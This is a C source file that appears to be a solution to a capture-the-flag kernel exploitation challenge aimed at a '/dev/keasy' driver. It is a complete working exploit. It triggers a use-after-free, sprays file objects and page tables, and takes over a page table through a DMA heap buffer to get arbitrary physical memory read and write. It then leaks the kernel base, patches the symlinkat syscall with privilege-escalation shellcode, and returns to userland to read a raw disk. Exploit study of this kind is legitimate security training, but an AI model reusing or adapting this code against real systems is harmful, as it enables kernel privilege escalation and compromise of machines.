#define _GNU_SOURCE

// clang-format off

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/ioctl.h>

// clang-format on

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_DEFAULT "\033[0m"

#define DMSG(fmt, ...) fprintf(stderr, "[*]\t" fmt "\n", ##__VA_ARGS__)

#define IMSG(fmt, ...)                                                         \
  fprintf(stderr, COLOR_GREEN "[+]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define EMSG(fmt, ...)                                                         \
  fprintf(stderr, COLOR_RED "[-]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define fatal(fmt, ...)                                                        \
  do {                                                                         \
    EMSG(fmt, ##__VA_ARGS__);                                                  \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

uint64_t user_cs, user_ss, user_rflags, user_rsp;

void save_status() {
  DMSG("Save status");
  asm volatile(".intel_syntax noprefix;"
               "mov user_cs, cs;"
               "mov user_ss, ss;"
               "mov user_rsp, rsp;"
               "pushf;"
               "pop user_rflags;"
               ".att_syntax prefix;");
}

void bind_core(int core) {
  DMSG("Bind to core: %d", core);
  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

#define KEASY_DRIVER "/dev/keasy"
#define DMA_HEAP_DRIVER "/dev/dma_heap/system"

#define FILE_SPRAY_NUM 0x100
#define PAGE_SPRAY_NUM 0x200

static int keasy_fd;
static int victim_fd;
static int dma_fd;
static int spray_fd[FILE_SPRAY_NUM];
static void *spray_page[PAGE_SPRAY_NUM];

#define DMA_HEAP_IOCTL_ALLOC 0xc0184800
struct dma_heap_allocation_data {
  uint64_t len;
  uint32_t fd;
  uint32_t fd_flags;
  uint64_t heap_flags;
};

#define PAGE_ATTR 0x8000000000000067

static void win() {
  char buf[0x100];
  int fd = open("/dev/sda", O_RDONLY);
  if (fd < 0) {
    fatal("[-] Lose...");
  } else {
    IMSG("Win!");
    read(fd, buf, 0x100);
    write(1, buf, 0x100);
    pause();
  }
  exit(0);
}

int main() {
  IMSG("STAGE 0: Initialization");
  save_status();
  bind_core(0);
  keasy_fd = open(KEASY_DRIVER, O_RDWR);
  if (keasy_fd < 0)
    fatal("Open %s failed!", KEASY_DRIVER);
  dma_fd = creat(DMA_HEAP_DRIVER, O_RDWR);
  if (dma_fd < 0)
    fatal("Cteat %s failed!", DMA_HEAP_DRIVER);
  DMSG("Prepare mmap");
  for (int i = 0; i < PAGE_SPRAY_NUM; i++) {
    spray_page[i] =
        mmap((void *)(0xdead0000UL + i * 0x10000UL), 0x8000,
             PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (spray_page[i] == MAP_FAILED)
      fatal("mmap");
  }

  IMSG("STAGE 1: Spray file");
  for (int i = 0; i < FILE_SPRAY_NUM / 2; i++) {
    spray_fd[i] = open("/", O_RDONLY);
    if (spray_fd[i] < 0)
      fatal("Spray file %d failed!", i);
  }

  DMSG("Trigger UAF");
  ioctl(keasy_fd, 0x114, 0xdeadbeef);
  victim_fd = spray_fd[FILE_SPRAY_NUM / 2 - 1] + 1;
  DMSG("Victim fd: %d", victim_fd);

  for (int i = FILE_SPRAY_NUM / 2; i < FILE_SPRAY_NUM; i++) {
    spray_fd[i] = open("/", O_RDONLY);
    if (spray_fd[i] < 0)
      fatal("Spray file %d failed!", i);
  }

  IMSG("STAGE 2: Put victim page to buddy system");
  for (int i = 1; i < FILE_SPRAY_NUM; i++) {
    close(spray_fd[i]);
  }

  IMSG("STAGE 3: Spray PTE to get victim page");
  for (int i = 0; i < PAGE_SPRAY_NUM / 2; i++) {
    for (int j = 0; j < 8; j++) {
      *(char *)(spray_page[i] + j * 0x1000) = 'A' + j;
    }
  }

  int dma_buf_fd = -1;
  struct dma_heap_allocation_data data;
  data.len = 0x1000;
  data.fd_flags = O_RDWR;
  data.heap_flags = 0;
  data.fd = 0;
  if (ioctl(dma_fd, DMA_HEAP_IOCTL_ALLOC, &data) < 0)
    fatal("DMA_HEAP_IOCTL_ALLOC");
  DMSG("dma_buf_fd: %d\n", dma_buf_fd = data.fd);

  for (int i = PAGE_SPRAY_NUM / 2; i < PAGE_SPRAY_NUM; i++) {
    for (int j = 0; j < 8; j++) {
      *(char *)(spray_page[i] + j * 0x1000) = 'A' + j;
    }
  }

  IMSG("STAGE 4: Find victim page");
  for (int i = 0; i < 0x1000; i++)
    dup(victim_fd);
  char *evil_page = NULL;

  for (int i = 0; i < PAGE_SPRAY_NUM; ++i) {
    if (*((char *)spray_page[i] + 7 * 0x1000) != 'A' + 7) {
      evil_page = (char *)spray_page[i] + 7 * 0x1000;
      break;
    }
  }
  if (evil_page == NULL)
    fatal("find evil page failed!");
  DMSG("evil page: %p", evil_page);

  IMSG("STAGE 5: DMA buffer point to page table");
  munmap(evil_page, 0x1000);
  void *dma_buff = mmap(evil_page, 0x1000, PROT_READ | PROT_WRITE,
                        MAP_SHARED | MAP_POPULATE, dma_buf_fd, 0);
  *(char *)dma_buff = '0';
  // getchar();

  for (int i = 0; i < 0x1000; i++)
    if (dup(victim_fd) < 0)
      fatal("dup");

  uint64_t leak_pte = *(uint64_t *)dma_buff;
  if ((leak_pte & PAGE_ATTR) != PAGE_ATTR)
    fatal("Leak pte failed: %#lx", leak_pte);
  DMSG("Leak PTE: %#lx", leak_pte);
  leak_pte += 0x1000;

  char *arb_read = NULL;
  *(uint64_t *)dma_buff = leak_pte;
  for (int i = 0; i < PAGE_SPRAY_NUM; ++i) {
    if (*(char *)spray_page[i] != 'A') {
      arb_read = (char *)spray_page[i];
      break;
    }
  }
  DMSG("Find victim mmap to read: %p ==> %c", arb_read, *arb_read);
  *(uint64_t *)dma_buff = 0x9c000 | PAGE_ATTR;
  uint64_t kernel_base_physical = *(uint64_t *)arb_read - 0x1c04063;
  DMSG("arb read %#lx", *(uint64_t *)arb_read);
  DMSG("kernel_base_physical %#lx", kernel_base_physical);
//   getchar();

  uint64_t symlinkat_addr = kernel_base_physical + 0x24d4c0;
  *(uint64_t *)dma_buff = symlinkat_addr | PAGE_ATTR;
  char shellcode[] = {
      0xf3, 0x0f, 0x1e, 0xfa, 0xe8, 0x00, 0x00, 0x00, 0x00, 0x41, 0x5f, 0x49,
      0x81, 0xef, 0xc9, 0xd4, 0x24, 0x00, 0x49, 0x8d, 0xbf, 0xd8, 0x5e, 0x44,
      0x01, 0x49, 0x8d, 0x87, 0x20, 0xe6, 0x0a, 0x00, 0xff, 0xd0, 0xbf, 0x01,
      0x00, 0x00, 0x00, 0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0,
      0x48, 0x89, 0xc7, 0x49, 0x8d, 0xb7, 0xe0, 0x5c, 0x44, 0x01, 0x49, 0x8d,
      0x87, 0x40, 0xc1, 0x0a, 0x00, 0xff, 0xd0, 0x49, 0x8d, 0xbf, 0x48, 0x82,
      0x53, 0x01, 0x49, 0x8d, 0x87, 0x90, 0xf8, 0x27, 0x00, 0xff, 0xd0, 0x48,
      0x89, 0xc3, 0x48, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
      0x49, 0x8d, 0x87, 0x50, 0x37, 0x0a, 0x00, 0xff, 0xd0, 0x48, 0x89, 0x98,
      0x40, 0x07, 0x00, 0x00, 0x31, 0xc0, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89,
      0x44, 0x24, 0x08, 0x48, 0xb8, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22, 0x22,
      0x22, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48, 0xb8, 0x33, 0x33, 0x33, 0x33,
      0x33, 0x33, 0x33, 0x33, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0xb8, 0x44,
      0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x44, 0x48, 0x89, 0x44, 0x24, 0x20,
      0x48, 0xb8, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x48, 0x89,
      0x44, 0x24, 0x28, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,
      0x66, 0x48, 0x89, 0x44, 0x24, 0x30, 0x49, 0x8d, 0x87, 0x41, 0x0f, 0xc0,
      0x00, 0xff, 0xe0, 0xcc};
  void *p;
  p = memmem(shellcode, sizeof(shellcode), "\x11\x11\x11\x11\x11\x11\x11\x11",
             8);
  *(size_t *)p = getpid();
  p = memmem(shellcode, sizeof(shellcode), "\x22\x22\x22\x22\x22\x22\x22\x22",
             8);
  *(size_t *)p = (size_t)&win;
  p = memmem(shellcode, sizeof(shellcode), "\x33\x33\x33\x33\x33\x33\x33\x33",
             8);
  *(size_t *)p = user_cs;
  p = memmem(shellcode, sizeof(shellcode), "\x44\x44\x44\x44\x44\x44\x44\x44",
             8);
  *(size_t *)p = user_rflags;
  p = memmem(shellcode, sizeof(shellcode), "\x55\x55\x55\x55\x55\x55\x55\x55",
             8);
  *(size_t *)p = user_rsp;
  p = memmem(shellcode, sizeof(shellcode), "\x66\x66\x66\x66\x66\x66\x66\x66",
             8);
  *(size_t *)p = user_ss;
  memcpy(arb_read + (symlinkat_addr & 0xfff), shellcode, sizeof(shellcode));
  DMSG("trigger sylinkat%d\n", symlink("/jail/x", "/jail"));
  getchar();
  return 0;
}